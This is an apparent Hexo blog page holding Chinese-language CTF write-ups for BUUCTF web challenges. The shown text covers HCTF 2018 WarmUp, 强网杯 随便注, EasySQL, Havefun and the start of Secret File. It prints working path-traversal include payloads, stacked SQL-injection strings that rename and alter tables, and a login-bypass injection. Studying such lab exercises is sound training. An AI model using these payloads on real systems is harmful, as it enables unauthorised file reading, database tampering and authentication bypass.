@@ -1,0 +1,943 @@
+
+ <!DOCTYPE HTML>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>buuctf_web_1 | Hexo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="John Doe">
+    
+
+    
+    <meta name="description" content="前言​    学如逆水行舟，不进则退">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buuctf_web_1">
+<meta property="og:url" content="http://example.com/2020/08/19/buuctf/buuctf-web-1/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言​    学如逆水行舟，不进则退">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201202201824877.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201202202154220.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201202202237785.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201202223029487.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201202223258355.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201202223345593.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201202224040703.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201202230350501.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201204210320229.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201204210419176.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201204211624621.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201204211649123.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201204211720604.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201204222836272.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201204223354547.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201204223533883.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201205194600014.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201205212413049.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201205213502972.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201205214543474.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201205214639982.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201205220909356.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201205221102544.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201205221645884.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201205221759545.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201205221926010.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201205223408268.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201205223646430.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201205224207314.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201205224743897.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201205224810817.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201205224934243.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201205225015752.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201205225157201.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201205225854848.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201205230013626.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201205230411507.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201205230538232.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201205231153819.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201205231229789.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201205231326467.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201205231606795.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201205232043564.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201205232326740.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201205232558100.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201206141327995.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201206141352225.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201206150605538.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201206150644552.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201206152052920.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201206154108690.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201206154739515.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201206154815618.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201206155541463.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201206155656232.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201206160053725.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201206160127612.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201206162054068.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201206162106152.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201206164026421.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201206171115527.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201206174807392.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201206175235243.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201206181514369.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201206181743642.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201206181849837.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201206182056945.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201206182140524.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201206182238440.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201206182252029.png">
+<meta property="article:published_time" content="2020-08-19T11:52:51.000Z">
+<meta property="article:modified_time" content="2021-05-23T11:06:23.122Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="buuctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/image-20201202201824877.png">
+
+    
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/tou1.png">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    
+<link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="/%02.css">
+<link rel="stylesheet" href="/.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.jpg" alt="Hexo" title="Hexo"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Hexo">Hexo</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/tags">Tags</a></li>
+					
+						<li><a href="/categories">Categories</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:example.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2020/08/19/buuctf/buuctf-web-1/" title="buuctf_web_1" itemprop="url">buuctf_web_1</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="John Doe" target="_blank" itemprop="author">John Doe</a>
+		
+  <p class="article-time">
+    <time datetime="2020-08-19T11:52:51.000Z" itemprop="datePublished"> Published 2020-08-19</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HCTF-2018-WarmUp"><span class="toc-number">2.</span> <span class="toc-text">[HCTF 2018]WarmUp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">3.</span> <span class="toc-text">[强网杯 2019]随便注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL1"><span class="toc-number">4.</span> <span class="toc-text">[极客大挑战 2019]EasySQL1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun"><span class="toc-number">5.</span> <span class="toc-text">[极客大挑战 2019]Havefun</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="toc-number">6.</span> <span class="toc-text">[极客大挑战 2019]Secret File</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-number">7.</span> <span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec-1"><span class="toc-number">8.</span> <span class="toc-text">[ACTF2020 新生赛]Exec 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-1"><span class="toc-number">9.</span> <span class="toc-text">[极客大挑战 2019]Knife 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RoarCTF-2019-Easy-Calc-1"><span class="toc-number">10.</span> <span class="toc-text">[RoarCTF 2019]Easy Calc 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP-1"><span class="toc-number">11.</span> <span class="toc-text">[极客大挑战 2019]PHP 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http-1"><span class="toc-number">12.</span> <span class="toc-text">[极客大挑战 2019]Http 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload-1"><span class="toc-number">13.</span> <span class="toc-text">[极客大挑战 2019]Upload 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL-1"><span class="toc-number">14.</span> <span class="toc-text">[极客大挑战 2019]BabySQL 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HCTF-2018-admin1"><span class="toc-number">15.</span> <span class="toc-text">[HCTF 2018]admin1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload1"><span class="toc-number">16.</span> <span class="toc-text">[ACTF2020 新生赛]Upload1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile1"><span class="toc-number">17.</span> <span class="toc-text">[ACTF2020 新生赛]BackupFile1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF-2019-CheckIn1"><span class="toc-number">18.</span> <span class="toc-text">[SUCTF 2019]CheckIn1</span></a></li></ol>
+		
+		</div>
+		
+		<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​    学如逆水行舟，不进则退</p>
+<span id="more"></span>
+
+<p>[HCTF 2018]WarmUp<br>[强网杯 2019]随便注<br>[极客大挑战 2019]EasySQL1<br>[极客大挑战 2019]Havefun<br>[极客大挑战 2019]Secret File<br> [GXYCTF2019]Ping Ping Ping<br>[ACTF2020 新生赛]Exec 1<br>[RoarCTF 2019]Easy Calc 1<br>[极客大挑战 2019]PHP 1<br>[极客大挑战 2019]Http 1<br>[极客大挑战 2019]Upload 1<br>[极客大挑战 2019]BabySQL 1<br>[HCTF 2018]admin1<br>[ACTF2020 新生赛]Upload1<br>[ACTF2020 新生赛]BackupFile1<br>[SUCTF 2019]CheckIn1</p>
+<h3 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h3><p>打开source.php后，得到源码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123; <span class="comment">//in_array()查找字符串中是否存在指定的值</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(<span class="variable">$page</span>, <span class="number">0</span> ,mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>));</span><br><span class="line">             <span class="comment">//mb_substr(str,0,2)函数返回字符串的一部分</span></span><br><span class="line">             <span class="comment">//mb_strpos(str1,str2)返回str2在str1中首次出现的位置</span></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(<span class="variable">$_page</span>, <span class="number">0</span> ,mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>));</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里面又有一个hint.php，打开之后只有一句话。<code>flag not here, and flag in ffffllllaaaagggg</code>。</p>
+<p>看来是要想办法读取到ffffllllaaaagggg的内容，来拿到flag。</p>
+<p>先看看下面的主函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])&amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])&amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure>
+
+<p><code>if (! empty($_REQUEST[&#39;file&#39;])&amp;&amp; is_string($_REQUEST[&#39;file&#39;])&amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])</code>中要求<code>emmm::checkFile($_REQUEST[&#39;file&#39;]</code>返回true，只要能返回true，就能<code>include $_REQUEST[&#39;file&#39;];</code>。</p>
+<p>来看看emmm::checkFile($_REQUEST[‘file’]函数，在这个函数中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123; <span class="comment">//in_array()查找字符串中是否存在指定的值</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+
+<p>whitelist是个白名单，只允许source.php和hint.php。这个if判断，会判断参数中是否含有source.php和hint.php。如果存在则返回true，如果失败则执行下面的代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_page</span> = mb_substr(<span class="variable">$page</span>, <span class="number">0</span> ,mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>));</span><br><span class="line">                               <span class="comment">//mb_substr(str,0,2)函数返回字符串的一部分</span></span><br><span class="line">                               <span class="comment">//mb_strpos(str1,str2)返回str2在str1中首次出现的位置</span></span><br></pre></td></tr></table></figure>
+
+<p>这段代码，首先会通过mb_strpos()函数返回在page中<code>?</code>第一次出现的位置，然后通过mb_substr()函数截取这一部分的字符串，赋值给_page。然后再进入新一轮的if判断,此时_page如果是白名单中的字符串，返回true，如果还没有，则再通过urldecode()解码以及再次进行截取，进入if判断，成功返回true。</p>
+<p>可以发现，这里有两个if都能返回true，我们只需要满足一处if条件，然后返回true，就可以利用 <code>../</code> 来穿越目录读取到我们想要的文件。</p>
+<p><strong>第一处</strong></p>
+<p>构造<code>?file=source.php?../../../../../../../../../../ffffllllaaaagggg</code>，经过mb_substr()时，就会只剩source.php，就会返回true，然后通过../即可穿越目录读取flag</p>
+<p><strong>第二处</strong></p>
+<p>第二处是在经过urldecode()解码之后再返回true，这样的话需要将<code>?</code>进行两次url编码，</p>
+<p><code>?file=source.php%25%33%46/../../../../../../ffffllllaaaagggg</code></p>
+<p>这样传入浏览器解码一次，<code>?file=source.php%3F/../../../../../../ffffllllaaaagggg</code></p>
+<p>urldecode()再解码一次，<code>?file=source.php?/../../../../../../ffffllllaaaagggg</code></p>
+<p>再经过截取，即可如上面一样，返回true。</p>
+<h3 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h3><p>作为一个彩笔，这题触及我的知识盲区了。</p>
+<p>开始的时候还是很愉快的，就SQL注入的老套路，<code>1&#39; order by 2#</code>猜出两列之后，上<code>1&#39; union select 1,database()#</code>之后，出现了<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code>，过滤了很多这么多关键字，大写、双写也不行。网上找了找wp。</p>
+<p>原来是堆叠注入</p>
+<p>原理</p>
+<p> 在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ;  结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union  injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union  all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM  products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where  productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。 </p>
+<p> 0’;show databases;# </p>
+<p> 0’;show tables;# </p>
+<p> 0’;show columns from words;# </p>
+<p> 查<code>询1919810931114514</code>表中所有列<br>1’;show columns from <code>1919810931114514</code>;#(字符串为表名操作时要加反引号) </p>
+<p> 根据两个表的情况结合实际查询出结果的情况判断出words是默认查询的表，因为查询出的结果是一个数字加一个字符串，words表结构是id和data，传入的inject参数也就是赋值给了id<br><strong>方法一(修改数据库结构):</strong><br>这道题没有禁用rename和alert，所以我们可以采用修改表结构的方法来得到flag<br>将words表名改为words1，再将数字名表改为words，这样数字名表就是默认查询的表了，但是它少了一个id列，可以将flag字段改为id，或者添加id字段 </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#</span></span><br></pre></td></tr></table></figure>
+
+<p> 这段代码的意思是将<code>words</code>表名改为<code>words1</code>，<code>1919810931114514</code>表名改为<code>words</code>，将现在的<code>words</code>表中的<code>flag</code>列名改为<code>id</code><br>然后用<code>1&#39; or 1=1 #</code>得到flag </p>
+<h3 id="极客大挑战-2019-EasySQL1"><a href="#极客大挑战-2019-EasySQL1" class="headerlink" title="[极客大挑战 2019]EasySQL1"></a>[极客大挑战 2019]EasySQL1</h3><p>使用万能密码即可得到flag，<code>username=1&#39; or 1#&amp;password=1</code></p>
+<h3 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h3><p>查看源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        $cat=$_GET[&#x27;cat&#x27;];</span><br><span class="line">        echo $cat;</span><br><span class="line">        if($cat==&#x27;dog&#x27;)&#123;</span><br><span class="line">            echo &#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>提交<code>?cat=dog</code>，即可。</p>
+<h3 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h3><p>经过一系列的页面跳转，抓包，得到secret3.php，在里面得到源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||stristr(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
